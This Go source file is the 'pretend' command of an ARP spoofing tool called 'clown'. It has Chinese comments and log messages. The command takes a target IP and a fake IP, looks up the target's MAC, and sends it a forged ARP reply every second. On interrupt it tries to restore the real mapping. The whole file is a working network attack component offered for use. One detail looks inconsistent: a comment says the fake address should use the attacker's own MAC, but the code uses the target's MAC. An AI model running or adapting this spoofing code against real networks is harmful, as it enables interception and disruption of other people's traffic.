package cmd

import (
	"fmt"
	"github.com/hades300/clown/arp"
	"github.com/hades300/clown/guard"
	"github.com/spf13/cobra"
	"log"
	"net"
	"os"
	"os/signal"
	"runtime"
	"time"
)

var (
	AttackInterval = 1
	Device         = "e"
)

var pretendCmd = &cobra.Command{
	Use:   "pretend [TARGET-IP] [PRETEND-FAKE-IP]",
	Short: "clown is a arp spoofing tool which work in len env",
	Long: `clown is a arp spoofing tool which work in len env
			Check https://github/hades300/clown for more info`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) != 2 {
			log.Fatal("Should Provide Target and Fake IP")
		}
		t := net.ParseIP(args[0])
		f := net.ParseIP(args[1])
		if t == nil || f == nil {
			log.Fatal("IP Pars Failld")
		}
		_, err := net.InterfaceByName(Device)
		if err != nil {
			log.Fatalf("接口%s不存在", Device)
		}
		// 目标MAC地址查询
		tAddr, err := arp.Lookup(t)
		if err != nil {
			log.Fatalf("目标 %s 不存在 ", t.To4().String())
		}
		// 伪装的Address 需要搭配任意的IP和自己的Mac地址
		fakeAddr := &arp.Address{
			IP:           f,
			HardwareAddr: tAddr.HardwareAddr,
		}
		ActiveSpoof(tAddr, fakeAddr)

	},
}

func init() {
	pretendCmd.PersistentFlags().StringVarP(&Device, "interface", "i", "", "选择要使用的网卡")
	SetDefaultInterface()
}

func ActiveSpoof(target *arp.Address, fake *arp.Address) {
	c := time.Tick(time.Duration(AttackInterval) * time.Second)
	signalC := make(chan os.Signal)
	signal.Notify(signalC, os.Interrupt)
	for {
		select {
		case <-c:
			data, err := arp.NewARPReply(fake, target)
			if err != nil {
				log.Fatal("ARP Reply 构造失败", err)
			}
			err = guard.Send(data)
			if err != nil {
				log.Fatal("发包失败", err)
			}
			fmt.Printf("[PRETEND]ARP ARP Reply told %s,%s => %s\n", target.IP.String(), fake.IP.String(), fake.HardwareAddr.String())
		case <-signalC:
			fmt.Println("SIGNAL RECEIVED...\n")
			fmt.Println("RECOVERING ARP IN LEN...\n")
			RecoverARP(target, fake)
			fmt.Println("SUCCEEDED🐶\n")
			os.Exit(0)
		}
	}
}

// 找到假扮的IP对应的MAC （可能没有）那就不需要了？？
// 找到的话，就发个真实的
func RecoverARP(target *arp.Address, fake *arp.Address) {
	var err error
	fake, err = arp.Lookup(fake.IP)
	if err != nil {
		// 没找到 直接返回吧
		return
	} else {
		// 找到了
		data, err := arp.NewARPReply(fake, target)
		if err != nil {
			log.Fatal("ARP Reply 构造失败", err)
		}
		err = guard.Send(data)
		if err != nil {
			log.Fatal("发包失败", err)
		}
		fmt.Printf("[RECOVER] ARP Reply told %s,%s => %s\n", target.IP.String(), fake.IP.String(), fake.HardwareAddr.String())
	}

}

func SetDefaultInterface() {
	if Device == "" {
		switch runtime.GOOS {
		case "windows":
			Device = "Ethernet"
		case "darwin":
			Device = "en0"
		case "linux":
			Device = "eth0"
		}
	}
}
